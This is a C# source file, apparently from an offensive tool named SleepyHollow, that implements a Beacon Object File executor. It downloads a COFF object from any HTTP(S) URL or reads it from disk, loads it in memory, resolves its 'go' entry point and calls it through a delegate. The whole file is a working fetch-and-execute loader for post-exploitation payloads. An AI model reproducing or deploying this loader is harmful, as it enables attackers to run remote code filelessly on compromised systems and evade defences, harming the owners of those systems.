using SleepyHollow.Bof.Types;
using System.Runtime.InteropServices;

namespace SleepyHollow.Bof;

internal class BeaconObjectExecutor(string file)
{
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void GoDelegate();
    public async Task RunAsync()
    {
        byte[] bofData =  await RetrieveBeaconObject();
        
        if (bofData.Length == 0)
        {
            Console.WriteLine("Failed to download BOF data.");
            Environment.Exit(1);
        }
        using var coff = new Coff(bofData);
        var entryPoint = coff.ResolveEntryPoint("go");
        try
        {
            ExecuteEntryPoint(entryPoint);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing BOF: {ex.Message}");
        }
    }

    private async Task<byte[]> RetrieveBeaconObject()
    {
        if (TryParseUrl(file, out var uriLocation))
        {
            if (RuntimeConfig.IsDebugEnabled)
                Console.WriteLine($"Downloading BOF from URL: {uriLocation}");
            using var client = new HttpClient();
            var response = await client.GetAsync(uriLocation);
            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to download BOF from {uriLocation}. Status code: {response.StatusCode}");
                Environment.Exit(1);
            }

            return await response.Content.ReadAsByteArrayAsync();
        }
        else if (File.Exists(file))
        {
            return File.ReadAllBytes(file);
        }
        else
        {
            Console.WriteLine($"BOF file not found: {file}");
            return [];
        }
    }

    private static bool TryParseUrl(string path, out Uri uriLocation)
    {
        uriLocation = null;
        if ( Uri.TryCreate(path, UriKind.Absolute, out var uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps))
        {
            uriLocation = uri;
            return true;
        }
        return false;
    }

    private static void ExecuteEntryPoint(IntPtr entryAddress)
    {
        if (RuntimeConfig.IsDebugEnabled)
            Console.WriteLine($"Executing entry point at address: 0x{entryAddress:X}");
        GoDelegate goFunc = Marshal.GetDelegateForFunctionPointer<GoDelegate>(entryAddress);
        try
        {
            if (RuntimeConfig.IsDebugEnabled)
                Console.WriteLine("==> [BOF Output]");
            goFunc();
        }
        catch (Exception ex)
        {
            var error = Lib.GetLastWin32Error();
            Console.WriteLine($"Error executing entry point: {ex.Message} - {error}");
            throw;
        }
    }
}
